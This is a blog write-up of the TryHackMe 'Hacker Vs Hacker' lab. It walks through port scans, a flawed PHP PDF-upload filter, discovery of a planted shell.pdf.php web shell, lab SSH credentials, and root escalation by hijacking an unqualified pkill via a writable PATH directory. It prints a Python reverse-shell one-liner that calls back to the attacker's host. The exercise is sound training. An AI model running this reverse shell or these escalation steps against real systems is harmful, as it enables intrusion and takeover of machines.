---
layout: post
title: Hacker Vs Hacker
date: 2022-08-13 03:40:52
categories: [Web, Tryhackme, Enumeration]
---

> VOiD XD


Hey everyone,This is short writup for an easy room [Hacker Vs Hacker Room](https://tryhackme.com/room/hackervshacker) (Someone has compromised this server already! Can you get in and evade their countermeasures?) on [Tryhackme](https://tryhackme.com)
Go check it out.


## Rustscan

Starting with all port scan using rustscan
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

We got two ports open, further enumeration

## Nmap

```bash
nmap -sC -sV -oN scans/init -vv 10.10.224.230
cat scans/init 
# Nmap 7.92 scan initiated Sat Aug 13 19:05:41 2022 as: nmap -sC -sV -oN scans/init -vv 10.10.224.230
Increasing send delay for 10.10.224.230 from 20 to 40 due to 11 out of 13 dropped probes since last increase.
Nmap scan report for 10.10.224.230
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-08-13 19:05:43 IST for 39s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=
|   256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 13 19:06:22 2022 -- 1 IP address (1 host up) scanned in 41.04 seconds
```


## PORT 80 [Apache httpd]

We are greeted with a nice page.
![hvh00.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh00.png)

Scrolling down we get a CV upload functionality.
![hvh0.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh0.png)

Trying to upload a test pdf.
We have :
![hvh1.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh3.png)

Looks like the hacker already hacked the page and commented the upload functionality.
lets breakdown the code
```php

Hacked! If you dont want me to upload my shell, do better at filtering! 

<!-- seriously, dumb stuff:
$target_dir = "cvs/";
// It sets the target directory

$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
// sets the target file

if (!strpos($target_file, ".pdf")) {
// strpos returns the posintion of substring in the main string,
// so if the filename contained .pdf it will pass else it shows error
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
// checks the file is already uploaded

  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
// Uploads the file in /cvs directory
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```
So we have figure out that the hacker uploaded a shell, and it contains a .pdf in filename.
My guess is that the file should look something like this : `filename.pdf.php` as its a server php is our way. 

Searching for the file using gobuster
```bash
gobuster dir -u http://10.10.224.230/cvs/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .pdf.php -t 50 | tee go_cvs.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.224.230/cvs/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
2022/08/13 19:35:35 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd.pdf.php    (Status: 403) [Size: 276]
/.hta.pdf.php         (Status: 403) [Size: 276]
/.htaccess.pdf.php    (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 26] 
/shell.pdf.php        (Status: 200) [Size: 18] 
                                               
===============================================================
2022/08/13 19:36:25 Finished
===============================================================
```
Volla! we got it : /shell.pdf.php
![hvh2.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh2.png)

Trying to get a reverse shell
![hvh3.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh3.png)

![hvh4.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh4.png)


So we are getting kicked out.
Further enumeration using webshell.

![hvh5.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh5.png)

![hvh6.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh6.png)

![hvh7.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh7.png)

```bash
┌──(void㉿kali)-[~/Tryhackme/Hacker_Vs_Hacker]
└─$ echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" 
dHY5pzmNYoETv7SUaY
thisistheway123
thisistheway123
```

## USER [lachlan]
Trying ssh

```bash
lachlan:thisistheway123
┌──(void㉿kali)-[~/Tryhackme/Hacker_Vs_Hacker]
└─$ ssh lachlan@10.10.224.230
lachlan@10.10.224.230s password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 13 Aug 2022 05:11:45 PM UTC

  System load:  0.0               Processes:             122
  Usage of /:   25.0% of 9.78GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for eth0: 10.10.224.230
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 13 16:51:47 2022 from 10.11.78.235
$ nope
Connection to 10.10.224.230 closed.
```
Same thing here
Lets check the process running

![hvh8.png]({{site.baseurl}}/all_collections/images/hacker_vs_hacker/hvh8.png)

```bash
root        5087  0.0  0.0   2608   592 ?        Ss   17:06   0:00 /bin/sh -c /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
root        5088  0.0  0.0   2608   596 ?        Ss   17:06   0:00 /bin/sh -c /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
root        5089  0.0  0.0   2608   532 ?        Ss   17:06   0:00 /bin/sh -c /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
root        5090  0.0  0.0   2608   592 ?        Ss   17:06   0:00 /bin/sh -c /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```
So we can see that root user is killing the /dev/pts sessions.
Notice how everything has absolute path execpt `pkill` so lets see how to exploit it.
Lets check the path variable:

```bash
┌──(void`㉿kali)-[~/Tryhackme/Hacker_Vs_Hacker]
└─$ ssh lachlan@10.10.224.230
lachlan@10.10.224.230 password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 13 Aug 2022 04:51:46 PM UTC

  System load:  0.0               Processes:             121
  Usage of /:   25.0% of 9.78GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for eth0: 10.10.224.230
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug 13 16:36:02 2022 from 10.11.78.235
$ echo $PATH
/home/lachlan/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ nope
Connection to 10.10.224.230 closed.
```
So we have `/home/lachlan/bin` in our path and if we put our malicious pkill there it will run as root.
but first lets get a stable shell.



```bash
┌──(void㉿kali)-[~/Tryhackme/Hacker_Vs_Hacker]
└─$ echo 'echo "" > ./bin/pkill;chmod +x ./bin/pkill' | ssh lachlan@10.10.224.230

lachlan@b2r:~$ cat user.txt 
thm{find_you_own_flag}
```
now lets just edit the pkill to get us a reverse shell:
```bash
#!/bin/sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.78.235",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## USER [root]
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.78.235] from (UNKNOWN) [10.10.224.230] 43868
# cat root.txt
cat root.txt
thm{find_the_root_flag.}
```
